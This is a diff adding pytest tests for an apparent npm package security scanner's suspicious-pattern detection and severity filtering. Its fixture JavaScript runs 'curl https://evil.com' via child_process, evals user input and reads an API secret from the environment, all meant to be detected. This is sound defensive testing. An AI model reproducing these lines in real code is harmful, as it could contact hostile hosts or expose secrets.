@@ -392,3 +392,113 @@ def test_no_detect_iocs_flag(tmp_path, capsys):
     # Should not detect IOCs
     assert "Script IOCs" not in captured.out
     assert "No compromised packages or IOCs detected" in captured.out
+
+
+def test_pattern_detection(tmp_path, capsys):
+    """Test detection of suspicious code patterns in JavaScript files."""
+    project_dir = tmp_path / "project"
+    project_dir.mkdir()
+
+    # Create package.json
+    (project_dir / "package.json").write_text(
+        json.dumps({"name": "test-package", "version": "1.0.0"}),
+        encoding="utf-8",
+    )
+
+    # Create JavaScript file with suspicious patterns
+    (project_dir / "index.js").write_text(
+        """
+        const child_process = require('child_process');
+        child_process.exec('curl https://evil.com');
+        eval(userInput);
+        const secret = process.env['API_SECRET'];
+        """,
+        encoding="utf-8",
+    )
+
+    advisory = tmp_path / "advisory.json"
+    advisory.write_text(
+        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
+        encoding="utf-8",
+    )
+
+    log_dir = tmp_path / "logs"
+
+    exit_code = scan.run(
+        [
+            str(project_dir),
+            "--advisory-file",
+            str(advisory),
+            "--log-dir",
+            str(log_dir),
+            "--format",
+            "structured",
+            "--no-color",
+            "--no-emoji",
+            "--detect-patterns",
+        ]
+    )
+
+    assert exit_code == 1
+    captured = capsys.readouterr()
+
+    # Check for pattern detection
+    assert "Suspicious Code Patterns" in captured.out or "Suspicious Patterns" in captured.out
+    assert "child_process" in captured.out or "eval_usage" in captured.out
+
+
+def test_pattern_severity_filter(tmp_path, capsys):
+    """Test pattern severity filtering."""
+    project_dir = tmp_path / "project"
+    project_dir.mkdir()
+
+    # Create package.json
+    (project_dir / "package.json").write_text(
+        json.dumps({"name": "test-package", "version": "1.0.0"}),
+        encoding="utf-8",
+    )
+
+    # Create JavaScript file with low and high severity patterns
+    (project_dir / "index.js").write_text(
+        """
+        const fs = require('fs');  // low severity
+        eval(userInput);  // high severity
+        """,
+        encoding="utf-8",
+    )
+
+    advisory = tmp_path / "advisory.json"
+    advisory.write_text(
+        json.dumps({"items": [{"package": "nonexistent", "version": "1.0.0"}]}),
+        encoding="utf-8",
+    )
+
+    log_dir = tmp_path / "logs"
+
+    # Scan with high severity filter - should only detect eval_usage
+    exit_code = scan.run(
+        [
+            str(project_dir),
+            "--advisory-file",
+            str(advisory),
+            "--log-dir",
+            str(log_dir),
+            "--format",
+            "json",
+            "--detect-patterns",
+            "--pattern-severity",
+            "high",
+        ]
+    )
+
+    assert exit_code == 1
+    captured = capsys.readouterr()
+
+    # Parse JSON output
+    findings = json.loads(captured.out)
+    pattern_findings = [f for f in findings if f.get("category") == "suspicious_pattern"]
+
+    # Should only have high severity patterns
+    assert len(pattern_findings) > 0
+    for finding in pattern_findings:
+        assert finding["severity"] in ["high", "critical"]
